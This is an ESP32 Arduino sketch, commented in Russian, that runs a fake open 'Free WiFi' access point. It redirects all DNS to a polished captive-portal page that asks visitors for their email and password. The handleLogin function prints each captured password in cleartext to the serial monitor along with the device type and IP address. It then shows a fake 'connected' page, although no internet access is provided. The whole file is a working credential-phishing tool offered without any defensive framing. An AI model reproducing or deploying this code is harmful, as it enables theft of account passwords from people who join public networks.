#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* ssid = "Free WiFi";  // Название сети для всех устройств
WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;

// Перехват всех запросов для принудительного открытия страницы
String generateLoginPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free WiFi Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #4158D0 0%, #C850C0 46%, #FFCC70 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        
        .container {
            width: 100%;
            max-width: 420px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .header {
            background: linear-gradient(145deg, #4158D0 0%, #C850C0 100%);
            padding: 40px 24px 30px;
            text-align: center;
            position: relative;
        }
        
        .wifi-animation {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .header h1 {
            color: white;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        
        .header p {
            color: rgba(255, 255, 255, 0.9);
            font-size: 16px;
            font-weight: 400;
        }
        
        .form-container {
            padding: 32px 24px;
        }
        
        .input-group {
            margin-bottom: 24px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .input-field {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #E8E8E8;
            border-radius: 16px;
            font-size: 16px;
            transition: all 0.3s;
            background: #F8F8F8;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #C850C0;
            background: white;
            box-shadow: 0 0 0 4px rgba(200, 80, 192, 0.1);
        }
        
        .input-field::placeholder {
            color: #999;
            font-weight: 400;
        }
        
        .connect-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(145deg, #4158D0 0%, #C850C0 100%);
            border: none;
            border-radius: 16px;
            color: white;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 16px;
            box-shadow: 0 10px 20px rgba(193, 80, 192, 0.3);
        }
        
        .connect-btn:active {
            transform: scale(0.98);
            box-shadow: 0 5px 10px rgba(193, 80, 192, 0.3);
        }
        
        .info-section {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 2px solid #F0F0F0;
        }
        
        .info-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
            color: #666;
            font-size: 14px;
        }
        
        .info-row span:first-child {
            font-weight: 600;
            color: #333;
        }
        
        .devices {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-top: 20px;
        }
        
        .device-icon {
            text-align: center;
            font-size: 24px;
            padding: 8px;
            background: #F5F5F5;
            border-radius: 12px;
            flex: 1;
        }
        
        .device-icon small {
            display: block;
            font-size: 12px;
            color: #666;
            margin-top: 4px;
        }
        
        .footer {
            text-align: center;
            margin-top: 24px;
            color: #999;
            font-size: 13px;
        }
        
        @media (max-width: 480px) {
            .header {
                padding: 30px 20px 25px;
            }
            
            .form-container {
                padding: 24px 20px;
            }
            
            .input-field {
                padding: 14px 16px;
            }
            
            .connect-btn {
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="wifi-animation">
                📶
            </div>
            <h1>Free WiFi</h1>
            <p>Для всех устройств • Без пароля</p>
        </div>
        
        <div class="form-container">
            <form action='/login' method='POST' id='wifiForm'>
                <div class="input-group">
                    <label class="input-label">📧 Email</label>
                    <input class="input-field" type="email" name="email" placeholder="your@email.com" required>
                </div>
                
                <div class="input-group">
                    <label class="input-label">🔑 Password</label>
                    <input class="input-field" type="password" name="password" placeholder="Введите пароль" required>
                </div>
                
                <button type="submit" class="connect-btn">
                    ПОДКЛЮЧИТЬСЯ
                </button>
            </form>
            
            <div class="info-section">
                <div class="info-row">
                    <span>📶 Сеть:</span>
                    <span>Free WiFi (открытая)</span>
                </div>
                <div class="info-row">
                    <span>🌐 IP адрес:</span>
                    <span>192.168.4.1</span>
                </div>
                <div class="info-row">
                    <span>📱 Устройства:</span>
                    <span>Телефоны • Планшеты • Ноутбуки</span>
                </div>
                
                <div class="devices">
                    <div class="device-icon">
                        📱 <small>iPhone</small>
                    </div>
                    <div class="device-icon">
                        🤖 <small>Android</small>
                    </div>
                    <div class="device-icon">
                        💻 <small>PC</small>
                    </div>
                </div>
            </div>
            
            <div class="footer">
                Нажимая "Подключиться", вы соглашаетесь с условиями использования
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('wifiForm').addEventListener('submit', function(e) {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            if (!email || !password) {
                e.preventDefault();
                alert('Пожалуйста, заполните все поля');
            }
        });
    </script>
</body>
</html>
)rawliteral";
}

// Страница после успешного входа
String generateSuccessPage(String email) {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подключение выполнено</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #4158D0 0%, #C850C0 46%, #FFCC70 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 32px;
            padding: 40px 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
            animation: scaleIn 0.5s ease;
        }
        
        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .success-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(145deg, #4158D0 0%, #C850C0 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 50px;
            color: white;
            animation: bounce 1s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 16px;
        }
        
        p {
            color: #666;
            font-size: 16px;
            margin-bottom: 24px;
            line-height: 1.6;
        }
        
        .info-block {
            background: #F8F8F8;
            border-radius: 16px;
            padding: 16px;
            margin: 24px 0;
            text-align: left;
        }
        
        .info-item {
            display: flex;
            align-items: center;
            margin: 12px 0;
            color: #555;
        }
        
        .info-item span:first-child {
            width: 90px;
            font-weight: 600;
            color: #333;
        }
        
        .btn-home {
            display: inline-block;
            padding: 14px 32px;
            background: linear-gradient(145deg, #4158D0 0%, #C850C0 100%);
            color: white;
            text-decoration: none;
            border-radius: 30px;
            font-weight: 600;
            font-size: 16px;
            margin-top: 16px;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-home:active {
            transform: scale(0.95);
        }
        
        .note {
            color: #999;
            font-size: 13px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="success-icon">
            ✅
        </div>
        <h2>Успешно!</h2>
        <p>Вы подключены к бесплатной сети Free WiFi</p>
        
        <div class="info-block">
            <div class="info-item">
                <span>📧 Email:</span>
                <span>)rawliteral" + email + R"rawliteral(</span>
            </div>
            <div class="info-item">
                <span>📶 Сеть:</span>
                <span>Free WiFi</span>
            </div>
            <div class="info-item">
                <span>🌐 Статус:</span>
                <span style="color: #4CAF50;">● Онлайн</span>
            </div>
        </div>
        
        <p>Теперь вы можете пользоваться интернетом</p>
        <a href="/" class="btn-home">Продолжить</a>
        <div class="note">
            Безопасное соединение • Бесплатный доступ
        </div>
    </div>
</body>
</html>
)rawliteral";
}

// Обработчик корневого пути и всех остальных запросов
void handleRoot() {
  server.send(200, "text/html", generateLoginPage());
  Serial.println("📱 Новое устройство подключилось к странице");
}

// Обработчик формы входа
void handleLogin() {
  String email = server.arg("email");
  String password = server.arg("password");
  
  // Получаем информацию об устройстве
  String userAgent = server.header("User-Agent");
  String deviceType = "Неизвестно";
  
  if (userAgent.indexOf("iPhone") > 0 || userAgent.indexOf("iPad") > 0) {
    deviceType = "📱 Apple iPhone/iPad";
  } else if (userAgent.indexOf("Android") > 0) {
    deviceType = "🤖 Android устройство";
  } else if (userAgent.indexOf("Windows") > 0) {
    deviceType = "💻 Windows ПК";
  } else if (userAgent.indexOf("Mac") > 0) {
    deviceType = "💻 Mac компьютер";
  } else if (userAgent.indexOf("Linux") > 0) {
    deviceType = "🐧 Linux устройство";
  }
  
  String clientIP = server.client().remoteIP().toString();
  
  // Статистика подключений
  static int connectionCount = 0;
  connectionCount++;
  
  // Вывод в Serial монитор с красивым оформлением
  Serial.println("\n╔══════════════════════════════════════════════════╗");
  Serial.println("║         🔔 НОВОЕ ПОДКЛЮЧЕНИЕ К WI-FI          ║");
  Serial.println("╠══════════════════════════════════════════════════╣");
  Serial.printf("║ 📧 Email:        %-30s ║\n", email.c_str());
  Serial.printf("║ 🔑 Пароль:       %-30s ║\n", password.c_str());
  Serial.println("╠══════════════════════════════════════════════════╣");
  Serial.printf("║ 📱 Устройство:   %-30s ║\n", deviceType.c_str());
  Serial.printf("║ 🌐 IP адрес:     %-30s ║\n", clientIP.c_str());
  Serial.println("╠══════════════════════════════════════════════════╣");
  Serial.printf("║ 📊 Всего подключений: %-25d ║\n", connectionCount);
  Serial.println("╚══════════════════════════════════════════════════╝\n");
  
  // Отправляем страницу успеха
  server.send(200, "text/html", generateSuccessPage(email));
}

// Перехват всех остальных запросов (для принудительного открытия портала)
void handleRedirect() {
  server.send(200, "text/html", generateLoginPage());
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║    🚀 ЗАПУСК WI-FI ТОЧКИ ДОСТУПА     ║");
  Serial.println("╠════════════════════════════════════════╣");
  
  // Создаем открытую точку доступа
  WiFi.softAP(ssid);
  
  Serial.printf("║ 📡 SSID:         %-20s ║\n", ssid);
  Serial.printf("║ 🔓 Тип сети:     Открытая (без пароля) ║\n");
  Serial.printf("║ 🌐 IP адрес:     %-20s ║\n", WiFi.softAPIP().toString().c_str());
  Serial.printf("║ 🔢 MAC адрес:    %-20s ║\n", WiFi.softAPmacAddress().c_str());
  Serial.println("╠════════════════════════════════════════╣");
  Serial.println("║ 📱 Поддерживаемые устройства:         ║");
  Serial.println("║    • Телефоны (iPhone, Android)       ║");
  Serial.println("║    • Планшеты                          ║");
  Serial.println("║    • Ноутбуки и ПК                    ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  // Запускаем DNS сервер для перехвата всех запросов
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  // Настраиваем обработчики
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  
  // Перехватываем все остальные запросы
  server.onNotFound(handleRedirect);
  
  server.begin();
  
  Serial.println("✅ DNS сервер запущен (перехват запросов)");
  Serial.println("✅ Web сервер запущен");
  Serial.println("✅ Портала авторизации активен");
  Serial.println("\n💡 Подключитесь к сети 'Free WiFi' и откройте любой сайт");
  Serial.println("   Вы будете перенаправлены на страницу входа\n");
}

void loop() {
  dnsServer.processNextRequest();  // Обрабатываем DNS запросы
  server.handleClient();           // Обрабатываем HTTP запросы
}
